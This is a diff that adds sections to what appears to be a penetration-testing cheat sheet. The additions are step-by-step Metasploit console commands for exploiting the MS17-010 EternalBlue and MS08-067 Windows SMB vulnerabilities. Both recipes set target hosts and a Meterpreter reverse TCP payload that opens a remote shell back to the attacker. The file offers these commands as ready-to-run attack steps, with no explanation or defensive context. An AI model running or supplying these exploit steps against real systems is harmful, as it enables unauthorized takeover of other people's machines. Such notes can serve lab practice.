@@ -68,3 +68,32 @@
 > ctrl c (terminate session 1)
 > ps (find pid of calc.exe and copy it)
 > kill pid (to terminate the process)
+
+
+
+
+--MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption--
+
+> msfconsole
+> search eternal
+> find eternal blue module and copy it (exploit/windows/smb/ms17_010_eternalblue)
+> use exploit/windows/smb/ms17_010_eternalblue
+> show options
+> set lhost local_ip
+> set lport local_port
+> set rhosts target_machine_ip
+> set payload windows/meterpreter/reverse_tcp
+> exploit
+
+
+
+
+--MS08-067 Microsoft Server Service Relative Path Stack Corruption--
+
+> msfconsole
+> use exploit/windows/smb/ms08_067_netapi
+> set rhosts target_machine_ip
+> set lhost local_ip
+> set lport local_port
+> set payload windows/meterpreter/reverse_tcp
+> exploit
